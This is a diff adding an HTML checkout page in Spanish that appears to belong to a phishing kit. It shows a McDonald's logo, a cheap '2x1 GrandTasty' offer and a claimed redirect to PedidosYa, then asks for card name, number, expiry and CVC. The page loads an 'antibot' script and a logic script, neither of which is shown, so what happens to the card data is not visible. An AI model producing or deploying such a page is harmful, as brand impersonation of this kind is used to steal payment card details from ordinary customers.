@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalizar Pedido - GrandTasty</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/antibot.js"></script>
+</head>
+<body>
+    <div class="container payment-container">
+        <header>
+            <img src="assets/logo.png" alt="McDonald's" class="logo">
+            <h2>Confirmar Pago</h2>
+        </header>
+
+        <div class="order-summary">
+            <p>Total a pagar: <strong>$18,000</strong></p>
+            <p>Producto: 2x1 GrandTasty</p>
+        </div>
+
+        <!-- BLOQUE DE REDIRECCIÓN CON IMAGEN LOCAL -->
+        <div style="text-align: center; background: #f0f0f0; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #ddd;">
+            <p style="font-size: 0.9rem; margin-bottom: 10px; color: #333;">
+                Una vez el pago se realice, será redirigido a la aplicación de:
+            </p>
+            <img src="assets/pedidosya.png" alt="PedidosYa" style="height: 35px; width: auto;">
+        </div>
+
+        <form id="paymentForm" class="payment-form">
+            <label for="cardName">Nombre en la tarjeta</label>
+            <input type="text" id="cardName" placeholder="Como aparece en la tarjeta" required>
+
+            <label for="cardNumber">Número de tarjeta</label>
+            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="16" required>
+
+            <div class="row">
+                <div class="col">
+                    <label for="expiry">Expiración (MM/AA)</label>
+                    <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" required>
+                </div>
+                <div class="col">
+                    <label for="cvc">CVC</label>
+                    <input type="text" id="cvc" placeholder="123" maxlength="3" required>
+                </div>
+            </div>
+
+            <button type="submit">Pagar y Recibir</button>
+        </form>
+    </div>
+
+    <script src="js/logic.js"></script>
+</body>
+</html>
